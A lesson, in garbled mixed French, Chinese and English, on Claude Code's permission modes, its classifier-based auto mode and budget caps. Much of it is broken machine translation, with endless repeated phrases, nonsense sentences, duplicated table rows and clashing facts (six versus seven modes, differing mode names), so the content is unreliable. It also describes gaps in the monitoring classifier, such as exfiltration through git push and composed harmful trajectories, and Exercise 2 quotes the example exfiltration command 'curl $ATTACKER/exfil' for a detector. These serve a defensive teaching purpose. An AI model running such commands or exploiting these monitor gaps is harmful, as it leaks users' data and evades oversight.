# Claude Code en tant qu'agent autonome: modes d'autorisation et mode automatique
# Mode d'autorisation pour les agents autonomes

> Une échelle de permissions  niveaux gradués d'autonomie de l'examen-chaque action à l'approbation-tout  est la façon dont un harnais régit ce qu'un agent autonome peut faire sans demander. Claude Code, l'exemple de travail de cette leçon, expose six de ces modes: "plan" demande avant chaque action, "défaut" (étiqueté "Manuel" dans l'interface utilisateur) demande uniquement pour les risques, "acceptEdits" approuve automatiquement les écrits de fichiers mais confirme toujours l'exécution de la coque, et "bypassPermissions" approuve tout. Mode automatique  le `auto`Le mode autorisation  remplace l'approbation par action par un modèle de classification séparé qui examine chaque action avant son exécution et bloque tout ce qui dépasse ce que la demande demande.`max_turns`et `max_budget_usd`. Disponibilité de `auto`dépend du plan, de l'activation de l'org, du modèle et du fournisseur  et Anthropic explique explicitement que le classifiant ne suffit pas à lui seul.

> **【中文解读】**Claude Code 暴露七个权限模式──"plan" 每动作前询问,"default" 仅对危险动作询问,"acceptEdits" 自动批准文件写入但仍确认 shell 执行,"bypassPermissions" 批准一切──Auto Mode(2026年3月24日) Using two phases并行安全分类器替代每动作审核:每动作运行单代币 快速检查;标记动作发发发思链深度审查──动作预算通过`max_turns`et `max_budget_usd`实施──Auto Mode 作为研究预览发布Anthropic 明确声明分类器单独不充分──

> **【拓展：权限阶梯 → 安全分级】**Les sept modes de Claude Code sont essentiellement " échelle d'autonomie ": plan → par défaut → acceptéEdits → ... → contournementPermissions. Chaque modèle est une différence de vitesse et de poids de chaque mouvement de révision. Les deux phases de l'Auto Mode permettent de déplacer l'approbation de la manière clé de l'utilisateur.

>  **【前置】**學本節前 請先掌握:Phase 15·01(Long-Horizon Agents) 理解为什么长程 代理 需要权限系统;Phase 14·27(Prompt Injection Defense) 理解为什么 代理 看到的内容不能全信──本节直接讲克劳德码的实际权限模式,是最贴近日常使用的代理安全课──

**Type:** Learn | **类型:** 学习
**Languages:** Python (stdlib, two-stage classifier simulator) | **语言:** Python（标准库，两阶段分类器模拟器）
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape) | **前置知识:** Phase 15 · 01（长程 Agent），Phase 15 · 09（编码 Agent 全景）
**Time:** ~45 minutes | **时间:** ~45 分钟

## Le problème , l' introduction du problème

> **【中文解读】**Le mode de contrôle des droits de Claude Code est un exemple typique du contrôle de sécurité des agents.

> **【拓展：claude code permission modes】**Le code Claude a été conçu pour mettre en œuvre les meilleures pratiques de sécurité de l'agent en 2026. Il est essentiel de définir les principes suivants: 1) le dernier droit: il ne confère que les droits nécessaires; 2) le droit d'accéder aux autorisations; 3) le contrôle des activités; 4) l'arrêt d'urgence; 4) la suspension à tout moment.

Un agent de codage autonome sur votre machine est une catégorie de sécurité distincte.

> L'agent de code autonome de votre machine est une catégorie de sécurité unique.

La surface d'attaque est tout ce que l'agent peut atteindre  système de fichiers, réseau, informations d'identification, planche à dos, n'importe quel onglet de navigateur, n'importe quel terminal ouvert. Bruce Schneier et d'autres ont marqué ceci publiquement: les agents d'utilisation informatique ne sont pas une " mise à jour de fonctionnalités " des chatbots, ils sont un nouveau type d'outil avec un nouveau type de profil de risque.

> L'attaque est un agent qui peut toucher à tout ce qui est lié à son système de fichiers, à son réseau, à ses certificats, à sa carte de visite, à tout navigateur, à tout terminal ouvert.

Le système de permission de Claude Code est la réponse de l'Anthropic. Au lieu d'un interrupteur "autonome / non autonome", il existe six modes couvrant une échelle de capacités: plan → par défaut → acceptéModifier → ... → contournerPermissions. Chaque mode est un compromis différent entre la vitesse et l'examen par action. Le mode automatique (mars 2026) ajoute un modèle de classification séparé qui déplace l'approbation de la voie critique de l'utilisateur: il examine chaque action avant qu'elle ne soit exécutée et bloque tout ce qui dépasse la demande.

> Le système de droits de Claude Code est une réponse à l'Anthropic. Il ne s'agit pas d'une clé " autonome / non autonome ", mais de sept modes de la échelle de capacité transversale: plan → par défaut → acceptéEdits → ... → contournementPermissions. Chaque mode est la vitesse et le poids de chaque mouvement de révision.

>  **【类比】**Le code Claude 权限模式 = 银行卡额度阶梯──(1) **plan**= 每笔交易都打电话问你;(2) **default**= grosse somme d'argent (environ 1000), petite somme automatique (environ 200 000)**acceptEdits**= 储蓄卡(消费自动,转账问);(4) **bypassPermissions (YOLO)**• • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • •

> ️ **【易错点】**Claude Code 权限的 3 个致命错误:(1) **本机用 bypassPermissions** Une injection rapide 就能 rm -rf /;                                                                                                                                                                                                                                                        **没设 max_budget_usd** Un cycle de course de vol 1 小时烧50$;务必设 `max_budget_usd=5`Il est un homme de bien.**完全信任 Auto Mode 分类器**Anthropic 明确说"分类器单独不充分";高危操作(rm、转账、发邮件) doit être confirmé à deux reprises, même si分类器说安全。


> **【中文解读】**Ce chapitre présente le concept et la méthode de réalisation de l'agent d'IA. L'agent est un système autonome à action de la MLL, capable d'observer l'environnement, de penser, de prendre des décisions, d'exécuter des actions et de les faire boucler jusqu'à la fin de l'objectif.

La question de l'ingénierie: que capture ce système, ce qu'il manque, et quel mode une tâche donnée justifie réellement?

> 工程问题: Ce système capture quoi, laisse quoi, fixe-t-il une tâche qui est réellement adaptée à quel modèle ?

## Le concept de base.

### Les sept modes de permissions.
### Les six modes d'autorisation

| Mode | Behavior | When to use |
|---|---|---|
| 模式 | 行为 | 何时使用 |
| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
| `plan` | Agent 提议计划；用户批准整个计划；每动作执行前审查 | 不熟悉任务；接近生产的代码；首次在仓库使用 Agent |
| `default` | Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `default` | Agent 运行动作；对任何"危险"动作（shell 执行、破坏性操作、网络调用）提示用户 | 多数交互编码会话 |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍提示 | 跨多文件重构 |
| `acceptExec` | Shell commands auto-approve within a curated allowlist; writes auto-approve | Tight inner loops where every shell command is `npm test` or similar |
| `acceptExec` | Shell 命令在策划允许列表内自动批准；写入自动批准 | 每条 shell 命令是 `npm test` 之类的紧密内循环 |
| `autoMode` | Two-stage safety classifier; flagged actions elevate to review | Long-horizon unattended runs in a constrained workspace |
| `autoMode` | 两阶段安全分类器；标记动作升级审查 | 受限工作区中的长程无人值守运行 |
| `yolo` | Skips most prompts; still runs tool allowlist / denylist | Ephemeral sandboxes, CI jobs, research scripts |
| `yolo` | 跳过多数提示；仍运行工具允许/拒绝列表 | 临时沙箱、CI 任务、研究脚本 |
| `default` | Labeled "Manual" in the UI. Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `auto` | A separate classifier model reviews each action before it runs; blocks anything escalating beyond the request | Long-horizon unattended runs in a constrained workspace |
| `dontAsk` | Never prompts; actions not pre-approved by permission rules are denied | Ephemeral sandboxes, CI jobs, research scripts |
| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |
| `bypassPermissions` | 批准一切 | 文档定为"仅在你愿意丢弃的临时容器内" |

(Les noms ci-dessus correspondent aux documents publics du code Claude; les étiquettes de l'interface utilisateur `default`comme "Manuel".)

> (上述名称匹配公开 Claude Code 文档;"yolo" est une traduction de la langue française de la langue française.

### Mode automatique en une page

Le mode automatique (lancé le 24 mars 2026) est le premier mode d'autorisation pour déléguer l'approbation par action à un modèle.

> Le mode automatique (en anglais: Auto Mode) est le premier mode autorisé à autoriser chaque mouvement.

La structure:

> 结构:

1. **Stage 1 — single-token classifier.**Retour "sécurisé" ou "flag". Conçu pour fonctionner en parallèle avec la boucle principale de l'agent afin que les actions approuvées ne restent pas dans la file d'attente.
   Le mot grec traduit par " le mot grec "**阶段 1——单 token 分类器。**Dans chaque proposition, le cycle de fonctionnement est effectué à un prix bas, le retour est effectué en "sécurité" ou en "marque" et le cycle de fonctionnement est réalisé en fonction de l'agent principal.
2. **Stage 2 — secondary policy/safety review.**Il fonctionne uniquement sur des actions marquées. Effectue une évaluation centrée de la politique et de la sécurité sur l'action, l'état actuel de la session et la tâche déclarée.
   Le mot grec traduit par " le mot grec "**阶段 2——二级政策/安全审查。** seulement dans le cadre de la mise en œuvre de la politique de mise au point et de l'évaluation de la sécurité  Engagement de la mise en œuvre de la politique de mise en œuvre et de l'évaluation de la sécurité  Réalisation de la mise en œuvre de la politique de mise en œuvre et de l'évaluation de la sécurité  Réalisation de la mise en œuvre de la politique de mise en œuvre et de l'évaluation de la sécurité  Réalisation de la mise en œuvre de la politique de mise en œuvre et de l'évaluation de la sécurité  Réalisation des activités  Réalisation des activités  Réalisation des activités  Réalisation des activités  Réalisation des activités  Réalisation des activités  Réalisation des activités  Réalisation des activités  Réalisation des activités  Réalisation des activités  Réalisation des activités  Réalisation des activités  Réalisation des activités  Réalisation des activités  Réalisation des activités  Réalisation des activités  Réalisation des activités  Réalisation des activités  Réalisation des activités  Réalisation des activités  Réalisation des activités  Réalisation des activités 
1. **A separate classifier model.**Révise chaque action proposée avant son exécution, juge la tâche déclarée et l'état actuel de la session, et bloque tout ce qui dépasse ce que la demande a demandé.
2. **Gated availability.**Que ce soit`auto`est proposé en tout dépend du plan, de l'organisation, du modèle et du fournisseur.

Les contrôles budgétaires sont placés à côté du classifiateur:

>  budgétaire et de la gestion des dépenses

- `max_turns` l'ensemble des itérations dans une session.
  Le mot grec traduit par " le mot grec "`max_turns`Je suis en train de vous parler.
- `max_budget_usd`- Le plafond de dollar qui annule la séance.
  Le mot grec traduit par " le mot grec "`max_budget_usd`停止会话的美元上限──
- Limits de compte d' action par outil (pas plus de N `WebFetch`les appels, etc.).
  Nom de fichier: N° 1`WebFetch`调用 et ainsi de suite)

### Ce que le système capture

- Injection rapide directe vers l'avant dans les entrées d'outil où l'instruction injectée correspond à une forme d'action connue de risque.
  En français, le mot "infiltration" est traduit par "infiltration".
- Les boucles d'outils répétitives  le classifiateur peut voir que l'action N+1 est presque identique à l'action N, cinq fois de suite.
  Le cycle de réaction N+1 est presque identique à celui de la réaction N ⇒ N.
- C'est clairement hors de portée des commandes de shell sur une session de modification de fichiers uniquement.
  En français, l'ordre de la shell est clairement dépassé.

### Ce que le système peut manquer

- **Subtle prompt injection**L'injection indirecte de prompt n'est pas une vulnérabilité entièrement patchable (tête de préparation OpenAI, 2025, sur les agents de navigation  voir leçon 11).
  Le mot grec traduit par " le mot grec "**微妙提示注入** dans le cas où il n'y a pas de mouvement de marque unique, modification du comportement.
- **Semantic-level misbehavior.**Chaque action individuelle peut paraître sûre tant que la trajectoire composée est nocive.
  Le mot grec traduit par " le mot grec "**语义级不当行为。**Chaque action individuelle semble sûre et la mise en place de trajectoires nocives.
- **Exfiltration through legitimate channels.**Écrire des données dans un fichier que vous possédez, alors `git push`En effet, la composition de la question est la composition de la question.
  Le mot grec traduit par " le mot grec "**通过合法渠道泄露。**- Je vais écrire le dossier.`git push`À la dépôt publique, est la séquence des mouvements autorisés, son assemblage est le problème.

### Rencadrement d'aperçu de la recherche

Anthropic a envoyé le mode automatique comme prévisualisation de recherche. La documentation indique explicitement que le classifiant est une couche et non une solution: les utilisateurs doivent combiner le mode automatique avec des budgets, des permissions, des espaces de travail isolés et des audits de trajectoires (leçons 1216). Le cadre d'aperçu reflète également l'écart documenté entre évaluation et déploiement (leçon 1)  un classifiant qui passe des évaluations hors ligne peut se comporter différemment dans une session réelle où le contexte de l'utilisateur est ambigu.

> Le modèle de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de l'analyse de la recherche.

### Là où cette échelle vit dans votre flux de travail

- tâche inconnue: démarrer `plan`- La lecture du plan est moins chère que de faire une mauvaise course.
  Le mot " mission " est traduit par " mission "`plan`Le centre commence à étudier.
- Refacteur connu: `acceptEdits`Ça économise beaucoup de clics de confirmation.
  Le texte est en français.`acceptEdits`Il y a beaucoup de confirmations.
- Exécution de fond non surveillée: `autoMode`uniquement dans un espace de travail dont le rayon de déploiement a été mesuré (pas de certificats, pas de montures de production, pas de sortie dans laquelle vous n'avez pas opté).
  Traduction anglaise: sans valeur humaine`autoMode`(sans permis, sans production, sans exportation non sélectionnée)
- Contenants éphémères: `yolo`- Je suis là .`bypassPermissions`est acceptable si et seulement si le conteneur et ses informations d'identification sont jetables.
  En anglais, le terme "contenu" signifie "contenu temporaire".`yolo`- Je suis là .`bypassPermissions`Il est acceptable de ne le faire que dans le contenant et ses justificatifs peuvent être rejetés.
- Exécution de fond non surveillée: `auto`uniquement dans un espace de travail dont le rayon de déploiement a été mesuré (pas de certificats, pas de montures de production, pas de sortie dans laquelle vous n'avez pas opté).
- Contenants éphémères: `dontAsk`- Je suis là .`bypassPermissions`est acceptable si et seulement si le conteneur et ses informations d'identification sont jetables.

```figure
autonomy-oversight
```

## Utilisez-le avec le cadre de réalisation

`code/main.py`• une simplification de l'enseignement; le réel`auto`Le mode est soutenu par un modèle de classifiant séparé, et non par un contrat documenté à deux étapes. La phase 1 est une règle de mots clés bon marché sur les actions proposées; la phase 2 est un réviseur multi-règle plus lent. Le conducteur se nourrit d'une courte trajectoire synthétique (actions sûres, une tentative d'injection rapide, une boucle répétitive) et montre où le classifiant attrape et où il manque.

> `code/main.py`La phase 1 est un référentiel de la proposition; la phase 2 est un référentiel de la recherche de plusieurs règles.

## Envoyez-le . Produit .

`outputs/skill-permission-mode-picker.md`correspond une description de tâche au mode d'autorisation approprié, aux limites budgétaires et à l'isolement requis.

> `outputs/skill-permission-mode-picker.md`La description des tâches correspond au mode de contrôle correct, aux limites budgétaires et à l'isolement nécessaire.

## Les exercices

1. On court .`code/main.py`Quel type d'action synthétique n'est jamais marqué par la phase 1 mais toujours capturé par la phase 2?
   Le mot " l' économie " est traduit par " l' économie ".`code/main.py`◊ Quels types de synthèse ne sont pas identifiés à la phase 1 mais sont généralement capturés à la phase 2 ?

2. Extension de la règle de la phase 1 pour saisir une forme connue de mauvaise qualité (p. ex., `curl $ATTACKER/exfil`) Mesurer le taux de faux positifs sur l'échantillon d'action bénigne.
   Le code de la loi est un code de la loi qui est utilisé pour détecter les mauvais traitements.`curl $ATTACKER/exfil`• ■ sur des échantillons de bonnes pratiques, des taux de fausses positivités

3. Lisez le document "Comment fonctionne la boucle d'agent" d'Anthropic.`default`Le mode. Vous devriez passer à la porte séparément avant de courir`autoMode`sans surveillance ?
   Le livre "Comment fonctionne la boucle d'agent" est publié en français.`default`模式下 Agent 默认触及的每一个外部状态――无人值守运行 `autoMode`Qu'est-ce que vous avez à contrôler ?
3. Lisez le document "Comment fonctionne la boucle d'agent" d'Anthropic.`default`Le mode. Vous devriez passer à la porte séparément avant de courir`auto`sans surveillance ?

4. Conception d' un budget de 24 heures sans surveillance: `max_turns`- Je suis là .`max_budget_usd`Les couvertures par outil, les permissions, justifier chaque numéro.
   Le projet de loi est en cours de réalisation.`max_turns`- Je suis là.`max_budget_usd`、 chaque outil sur limite、 permettre la liste──论证每个数字──

5. Décrivez une trajectoire où chaque action individuelle est approuvée par la phase 1 et la phase 2, mais le comportement composé est mal aligné. (L'enseignement 14 couvre la façon dont les commutateurs de destruction et les jetons canariens traitent cela.)
   Le code de conduite est un code de conduite qui est utilisé pour traiter les problèmes de sécurité et de sécurité.
5. Décrivez une trajectoire où chaque action individuelle est approuvée par le classifiateur, mais où le comportement composé est mal aligné. (L'enseignement 14 couvre la façon dont les commutateurs de destruction et les jetons canariens traitent cela.)

## Les termes clés

| Term | What people say | What it actually means |
|---|---|---|
| 术语 | 通俗说法 | 实际含义 |
| Permission mode | "How much the agent can do" | One of seven named policies controlling per-action approval |
| 权限模式 | "Agent 能做多少" | 控制每动作审批的七种命名策略之一 |
| Permission mode | "How much the agent can do" | One of six named policies controlling per-action approval |
| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
| plan 模式 | "任何事前询问" | Agent 写计划；用户执行前批准 |
| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
| acceptEdits | "让它写文件" | 文件写入自动批准；shell 执行仍提示 |
| autoMode | "Auto approvals" | Two-stage safety classifier; flagged actions escalate |
| autoMode | "自动批准" | 两阶段安全分类器；标记动作升级 |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| bypassPermissions | "完全 YOLO" | 批准一切；用于临时容器 |
| Stage 1 classifier | "Fast token check" | Single-token rule over proposed action; runs in parallel |
| 阶段 1 分类器 | "快速 token 检查" | 提议动作上的单 token 规则；并行运行 |
| Stage 2 classifier | "Deep review" | Chain-of-thought reasoning over flagged actions |
| 阶段 2 分类器 | "深度审查" | 对标记动作的思维链推理 |
| auto | "Auto approvals" | Separate classifier model reviews each action; blocks escalation beyond the request |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| Stage 1 (simulator) | "Fast keyword check" | Cheap rule over proposed actions in `code/main.py` |
| Stage 2 (simulator) | "Deep review" | Slower multi-rule reviewer for flagged actions in `code/main.py` |
| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |
| 研究预览 | "非 GA" | Anthropic 对失败模式仍在映射的功能的框架 |

## Encore une lecture

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) modes d'autorisation, budgets, format d'action.
  Le modèle de pouvoir, le budget, le mouvement.
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) modèle d'exécution des services gérés.
  Le modèle d'exécution de la gestion de services.
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) surface de fonctionnalité et annonce de mode automatique.
  Le mode de fonctionnement et le mode automatique
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) la couche fondée sur la raison qui façonne les jugements des classifiateurs.
  Traduction anglaise: " la formation de la classe de jugement basée sur la théorie ".
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) Perspective interne sur la conception des permis à long terme.
  Le langage est le même que celui de la langue française.
